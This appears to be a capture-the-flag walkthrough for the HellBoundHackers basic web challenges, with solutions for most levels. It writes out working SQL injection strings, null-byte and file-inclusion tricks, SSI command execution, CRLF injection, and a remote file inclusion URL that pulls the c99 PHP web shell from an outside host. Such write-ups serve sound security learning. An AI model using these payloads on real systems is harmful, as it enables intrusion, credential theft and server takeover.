## Basic 1
Similiar to HTS 1, looking in the source reveals the following comment: `<!-- When you pet me, I purr. -->` From there, the solution is pretty obvious.

## Basic 2
For this challenge, we are asked to find the source of an iframe - lucky for us, iframes have a "src" element that lables their origin. If you inspect the element, we find the following code:
`<iframe border="0" height="250" width="500" align="center" name="content" src="../basic1/b2/index.php" frameborder="0" scrolling="yes"></iframe>`

## Basic 3
In a nice break, this challenge says exactly what it is looking for:`Wrong user_agent, bwh3_user_agent wasn't found` Easiest way to tackle this is to download a user-agent switching extension and set your user agent as requested.

## Basic 4
This challenge requires a bit of guess-work - we know we are looking for a htpasswd file, but that it is not in basic4's directory. First thought is to maybe scan in either direction: basic3 returns a 404, but https://www.hellboundhackers.org/challenges/basic5/htpasswd.php gives us our challenge's password.

## Basic 5
I've read the introduction like six fucking times and have no fucking idea what it is trying to say. It's something with a wildcard. Remember the username is an email address. Just fuck this challenge, here is the answer I got after a lot of trial and error:
```
*@*:*
```

## Basic 6
First we need to find the location of these files - I used DirBuster but any url fuzzer will work. It should find a logs/ directory with logs.txt and track_logs.php.

For the commands, make sure you place a space between $ and the actually command. In addition, use a+x for chmod, not the number representation. For the rm commands, -f is not required.

## Basic 7
Looking at our cookies, we see we have two cookies: username = sam, and password = jillisdead. According to the challenge, "he decrypted it from ASCII encryption." I'm not sure what ASCII encrpytion is, but I guessed it meant we needed to change our username cookie. I initially tried converting 'sam' to hex, but it ends up being binary that is the correct encryption.

Once we get past that, the password we can break with a simple SQL injection:
```
' or 1=1--
```

## Basic 8
Entering a fake password reveals a nice clue:
```
SQL Query Error: SELECT * FROM family_db WHERE password='asd' 
```

Looking at the source reveals another helpful hint:
```
<!-- ?sql_query -->
```

Worth a shot to see if secure_php is accepting this as an argument we can post:
```
/secure-area.php?sql_query=SELECT * FROM family_db
```

## Basic 9
```
<!-- The Admin also said something about null or something like that, and he made a special script that it cannot be injected by the url. but i don't know what he is talking about (why dont you find out)-->
```

Key to this is using a poisoned null byte (%00, which causes badly-coded php to drop the rest of the string). The page you are delivered to has the username and password in the source.

## Basic 10
Proxy based problem. Going to the blocked page will reveal the requested range in the comments.

## Basic 11
Simply create a user-agent string that contains the string "HellBoundHackersOS" to pass this challenge.

## Basic 12
We can abuse the file-inclusion exploit. Looking at the URL:
```
index.php?page=challenges.php
```

Since we can guess there is an .htaccess file in the protected folder:
```
index.php?page=protected/.htaccess
```

This will give you a DES hash that you can crack with John the Ripper. Make sure you download a word-list and don't brute-force it.

## Basic 13
Simply change the value of Frank's entry to George. Simple with Chrome.

## Basic 14
The password for this is revealed in the source code.

## Basic 15
The hint text should give a pretty clear idea - look at robots.txt to see where our hidden file is.

## Basic 16
Well let's try our tried and true SQL injection:
```
' or 1=1--
```

## Basic 17
A java applet this time to vary things up. Download basic17.class and use a java decompiler to view its source:
```
	public basic17()
    {
        file4 = "baysick-seventeen.complete.php?pass=";
        inputLine = new TextField(15);
        file2 = "test";
        add(inputLine);
        inputLine.addActionListener(this);
        file2 = "challenges";
    }

    public void actionPerformed(ActionEvent actionevent)
    {
        String s = inputLine.getText();
        if(s.equals("ifYOU'REhereYOU'REelite"))
        {
            URL url = null;
            String s1 = "http://www.hellboundhackers.org/";
            String s2 = "basic17";
            try
            {
                url = new URL(getDocumentBase(), s1 + "/" + file2 + "/" + s2 + "/" + file4 + new String("elite"));
            }
            catch(MalformedURLException malformedurlexception) { }
            getAppletContext().showDocument(url);
        } else
        {
            inputLine.setText("not yet");
        }
    }
```

Since this is Java, basic17 will be called first as the constructor, rendering the following values that we care about:
```
    //file4 = baysick-seventeen.complete.php?pass=
    //file2 = challenges
```

From here, it is simple enough to go through the url and manually insert the correct values:
```
	//http://www.hellboundhackers.org/challenges/basic17/baysick-seventeen.complete.php?pass=elite
```

## Basic 18
This is a blind sql injection based problem. This can be verified by doing:
```
?id=1 AND 1=1-- (will return results)
?id=1 AND 1=2-- (won't return results)
```

Normally you use blind sql to union different tables to gain insight into their information. Here it just wants you to select everything from the `Articles` table. To do this, first find the amount of columns by using `ORDER BY` until you get an error:
```
https://www.hellboundhackers.org/challenges/basic18/index.php?id=1 ORDER BY 5--
```

Then use the amount of columns to union the articles table against itself. NULLs are used as placeholders since the challenge does not care:
```
https://www.hellboundhackers.org/challenges/basic18/index.php?id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL%20FROM%20Articles
```

## Basic 19
Use Burp or another tool to view the headers set when visiting the page. One header will reveal the encryption method and the other will reveal the password.

## Basic 20
The code reveals that it is using a cookie to determine the user:
```
void(document.cookie="whoami=fire");
```

Set the cookie to `admin` and you will see a different error message. It gives a hint that it wants you to poison the cookie with some sql stuff - throw in the classic ' OR 1=1-- to the cookie to pass the challenge.

## Basic 21
This is another SQL based challenge. Verify that the username field is vulnerable by insert a ' in the field and receiving an error. This challenge wants you to abuse the `having` keyword to get the columns. Try `' having 1=1--` and the application will return that it expects a users.id column. Use the errors to build out the rest of columns. 

Now that you know the columns, you can union the fields you need via: `%27+union+select+password%2C1%2C1%2C1+from+users+where+username+%3D+%27admin%27--` to retrieve the password.

## Basic 22
This challenge focuses on server-side includes. A good primer is available from OWASP: https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection

This challenge cares about formatting and slashes. First verify that the command field is vulnerable:
```
<!--#exec cmd="ls" -->
```
This will display the current directory. Next, view the form on the page to see that it is posting to "secretdir/secure.php". Use this directory in a command:
```
<!--#exec cmd="ls secretdir/" -->
```
This will give the name of a file with the password in it. Simply view that file to get your admin password:
https://www.hellboundhackers.org/challenges/basic22/secretdir/passfilebasic.php

## Basic 23
This challenge focuses on remote file inclusion. A good primer is available from OWASP: https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion

We can easily verify this site is vulnerable by using google as a test:
```
https://www.hellboundhackers.org/challenges/basic23/site/show.php?page=http://google.com
```
To exploit this, we need to upload a shell on the server. We can get an example shell from the following github link:
```
https://raw.githubusercontent.com/Snifer/L4bsForShell/master/PHP/c99.txt
```
Throw this link in the challenge, like so:
```
https://www.hellboundhackers.org/challenges/basic23/site/show.php?page=http://raw.githubusercontent.com/Snifer/L4bsForShell/master/PHP/c99.txt
```
On a real assessment, this would then return a shell to the target that you could access.

## Basic 25
This description is really vague, but it basically asking you to convert hellboundhackers.org's ip to its decimal format. There are tools only to do this.

## Basic 27
This is classic filter evading. One major issue filters typically miss is recursion. In this case, the following string will bypass the filter:
```
<scrscriptipt>
```

## Basic 28
This uses crlf injection to add an additional field. Edit the response email in burp to something like:
```
fname=a&email=a@a.com%0d%0aBcc:a@a.com&message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
You'll get an email with the password.
